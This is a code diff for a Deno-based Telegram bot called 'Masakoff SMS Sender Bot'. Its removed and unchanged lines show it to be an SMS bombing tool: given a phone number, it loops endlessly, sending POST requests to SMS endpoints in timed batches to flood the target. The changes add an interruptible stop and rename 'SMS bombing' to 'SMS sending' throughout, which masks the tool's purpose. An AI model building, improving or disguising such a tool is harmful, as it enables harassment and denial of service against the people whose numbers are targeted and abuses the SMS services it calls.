@@ -2,7 +2,7 @@
 // 💥 Masakoff SMS Sender Bot (Deno)
 // 🚀 Created by @Masakoff | FlapsterMinerManager
 // Sends POST requests in batches of 3 with delays via Telegram webhook
-// ✨ Includes global /stop command to halt all running SMS tasks
+// ✨ /stop stops all running tasks immediately, even during waits
 
 import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
 import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";
@@ -47,6 +47,19 @@ async function sendPostRequest(url: string, headers: Record<string, string>, dat
 // --- 🧠 Track all active tasks ---
 const activeTasks = new Map<string, { stop: boolean }>();
 
+// --- ⏱ Interruptible sleep helper
+// Sleeps up to totalMs but checks `task.stop` every chunkMs and aborts if stop set.
+// Returns true if completed full sleep, false if interrupted by stop.
+async function sleepInterruptible(totalMs: number, task: { stop: boolean }, chunkMs = 500): Promise<boolean> {
+  const start = Date.now();
+  while (Date.now() - start < totalMs) {
+    if (task.stop) return false;
+    const remaining = totalMs - (Date.now() - start);
+    await delay(Math.min(chunkMs, remaining));
+  }
+  return true;
+}
+
 // --- 💣 SMS sending logic ---
 async function sendSMS(phoneNumber: string, chatId: string) {
   const requestsData = [
@@ -68,7 +81,7 @@ async function sendSMS(phoneNumber: string, chatId: string) {
   activeTasks.set(chatId, task);
 
   let count = 0;
-  await sendMessage(chatId, `📱 Starting SMS bombing for +993${phoneNumber} 🔥`);
+  await sendMessage(chatId, `📱 Starting SMS sending to +993${phoneNumber} 🔥`);
 
   while (!task.stop) {
     for (let batch = 0; batch < 3; batch++) {
@@ -79,16 +92,23 @@ async function sendSMS(phoneNumber: string, chatId: string) {
         await sendMessage(chatId, `📤 Sending SMS #${count} to +993${phoneNumber}...`);
         const success = await sendPostRequest(req.url, req.headers, req.data);
         await sendMessage(chatId, success ? "✅ Sent successfully!" : "⚠️ Failed to send.");
-        await delay(5000); // ⏱ Wait 5 seconds between each
+        // Interruptible 5s between each SMS
+        const completed5 = await sleepInterruptible(5000, task, 250);
+        if (!completed5) break;
       }
     }
+
     if (task.stop) break;
-    await sendMessage(chatId, "⏳ 3 SMS sent! Waiting 45 seconds before next batch...");
-    await delay(45000);
+
+    await sendMessage(chatId, "⏳ Batch of 3 SMS completed. Waiting 45 seconds before next batch...");
+    // Interruptible 45s pause
+    const completed45 = await sleepInterruptible(45000, task, 500);
+    if (!completed45) break;
   }
 
+  // cleanup
   activeTasks.delete(chatId);
-  await sendMessage(chatId, "⏹ All SMS processes stopped. 💫 Thank you for using @Masakoff bot!");
+  await sendMessage(chatId, "⏹ SMS sending stopped. Thank you! 🎉");
 }
 
 // --- 🖥️ Webhook Server ---
@@ -121,7 +141,7 @@ serve(async (req) => {
       "👋 Welcome to the 💥 Masakoff SMS Sender Bot 💥\n\n" +
       "📲 Use:\n" +
       "• /send <number> — start sending SMS\n" +
-      "• /stop — stop all sending immediately ⛔\n\n" +
+      "• /stop — stop all sending immediately (no number required) ⛔\n\n" +
       "✨ Created by @Masakoff | FlapsterMinerManager"
     );
   }
@@ -132,17 +152,21 @@ serve(async (req) => {
       await sendMessage(chatId, "⚠️ Please provide a phone number.\nExample: /send 61234567");
     } else {
       const phoneNumber = parts[1].replace(/^\+993/, "");
-      await sendMessage(chatId, `🚀 Starting SMS bombing for +993${phoneNumber}...`);
+      await sendMessage(chatId, `🚀 Starting SMS sending to +993${phoneNumber}...`);
       sendSMS(phoneNumber, chatId).catch(console.error);
     }
   }
 
   else if (text.startsWith("/stop")) {
+    // Global stop — no phone number needed
     if (activeTasks.size > 0) {
       for (const task of activeTasks.values()) {
         task.stop = true;
       }
-      await sendMessage(chatId, "🛑 All running SMS tasks have been stopped successfully!");
+      // Note: tasks will reply to their respective chats that they stopped once they exit,
+      // but we also send an immediate confirmation to the admin who invoked /stop.
+      await sendMessage(chatId, "🛑 All running SMS tasks have been signalled to stop. They will stop immediately, even if waiting.");
+      // clear the map to avoid stale entries (tasks also delete themselves when finishing)
       activeTasks.clear();
     } else {
       await sendMessage(chatId, "ℹ️ No active SMS tasks found to stop.");
@@ -155,6 +179,7 @@ serve(async (req) => {
 
   return new Response("OK");
 });
+
 
 
 
